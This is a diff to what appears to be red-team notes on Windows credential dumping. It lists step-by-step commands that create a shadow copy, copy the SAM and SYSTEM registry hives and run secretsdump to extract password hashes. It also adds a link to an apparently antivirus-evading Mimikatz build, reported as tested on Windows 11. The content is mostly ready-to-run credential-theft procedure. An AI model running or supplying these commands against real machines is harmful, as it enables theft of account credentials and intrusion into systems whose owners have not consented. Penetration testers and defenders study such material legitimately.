@@ -57,9 +57,18 @@ SAM/SECURITY Hives: These contain local account information and system security 
 LSASS Process: LSASS handles both local and domain credentials, managing in-memory credential caches that include plaintext passwords, hashes, and Kerberos tickets. Dumping from LSASS offers a more comprehensive set of credentials, including those of currently logged-in users. This requires administrative access and is performed on a running system.
 
 <code>
-Run [ Windows11 ]
-$shadow = [WMIClass]"root\cimv2:Win32_ShadowCopy"
-$shadow.Create("C:\\", "ClientAccessible")
-copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[Number]\windows\system32\config\SAM C:\[SAM\To\Be\Saved\]
-copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[Number]\windows\system32\config\SYSTEM C:\[SYSTEM\To\Be\Saved\]
-python3 /opt/impacket/examples/secretsdump.py -sam Sam -system SYSTEM LOCAL
+On windows 10/11:
+1. $shadow = [WMIClass]"root\cimv2:Win32_ShadowCopy"
+2. $shadow.Create("C:\\", "ClientAccessible")
+3. copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[Number]\windows\system32\config\SAM C:\[SAM\To\Be\Saved\]
+4. copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[Number]\windows\system32\config\SYSTEM C:\[SYSTEM\To\Be\Saved\]
+5. python3 /opt/impacket/examples/secretsdump.py -sam Sam -system SYSTEM LOCAL
+</code>
+
+## 7. Mimikatz
+<code>
+Visit the link - > https://github.com/HernanRodriguez1/MimikatzFUD
+</code>
+
+Build: mimikatz 2.2.0 (x64) #19041 Aug 10 2021 02:01:23<br>
+Tested: Microsoft Windows 11 Pro - 10.0.22000 N/D Compilación 22000
